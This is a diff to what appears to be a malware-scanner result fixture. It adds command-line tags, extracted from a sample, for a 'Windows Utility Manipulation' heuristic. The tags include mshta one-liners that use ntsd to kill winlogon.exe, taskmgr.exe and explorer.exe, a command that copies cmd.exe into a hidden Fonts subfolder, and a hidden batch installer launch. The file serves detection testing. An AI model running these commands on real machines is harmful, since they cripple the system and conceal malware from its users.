@@ -72,7 +72,19 @@
           "score_map": {},
           "signatures": {}
         },
-        "tags": {},
+        "tags": {
+          "dynamic": {
+            "process": {
+              "command_line": [
+                "copy C:\\WINDOWS\\system32\\cmd.exe C:\\WINDOWS\\Fonts\\HIDESE~1\\%%i",
+                "mshta \"javascript:new ActiveXObject('WScript.Shell').Run('ntsd -pn winlogon.exe',0);window.close()\"",
+                "mshta \"javascript:new ActiveXObject('WScript.Shell').Run('ntsd -c q -pn taskmgr.exe',0);window.close()\"",
+                "mshta \"javascript:new ActiveXObject('WScript.Shell').Run('ntsd -c q -pn explorer.exe',0);window.close()\"",
+                "mshta \"javascript:new ActiveXObject('WScript.Shell').Run('C:\\\\~Install\\\\Install.bat %%1',0);window.close()\""
+              ]
+            }
+          }
+        },
         "title_text": "Windows Utility Manipulation",
         "zeroize_on_tag_safe": false
       },
@@ -117,7 +129,35 @@
         "signatures": []
       }
     ],
-    "tags": {},
+    "tags": {
+      "dynamic.process.command_line": [
+        {
+          "heur_id": 7,
+          "signatures": [],
+          "value": "copy C:\\WINDOWS\\system32\\cmd.exe C:\\WINDOWS\\Fonts\\HIDESE~1\\%%i"
+        },
+        {
+          "heur_id": 7,
+          "signatures": [],
+          "value": "mshta \"javascript:new ActiveXObject('WScript.Shell').Run('C:\\\\~Install\\\\Install.bat %%1',0);window.close()\""
+        },
+        {
+          "heur_id": 7,
+          "signatures": [],
+          "value": "mshta \"javascript:new ActiveXObject('WScript.Shell').Run('ntsd -c q -pn explorer.exe',0);window.close()\""
+        },
+        {
+          "heur_id": 7,
+          "signatures": [],
+          "value": "mshta \"javascript:new ActiveXObject('WScript.Shell').Run('ntsd -c q -pn taskmgr.exe',0);window.close()\""
+        },
+        {
+          "heur_id": 7,
+          "signatures": [],
+          "value": "mshta \"javascript:new ActiveXObject('WScript.Shell').Run('ntsd -pn winlogon.exe',0);window.close()\""
+        }
+      ]
+    },
     "temp_submission_data": {}
   }
 }
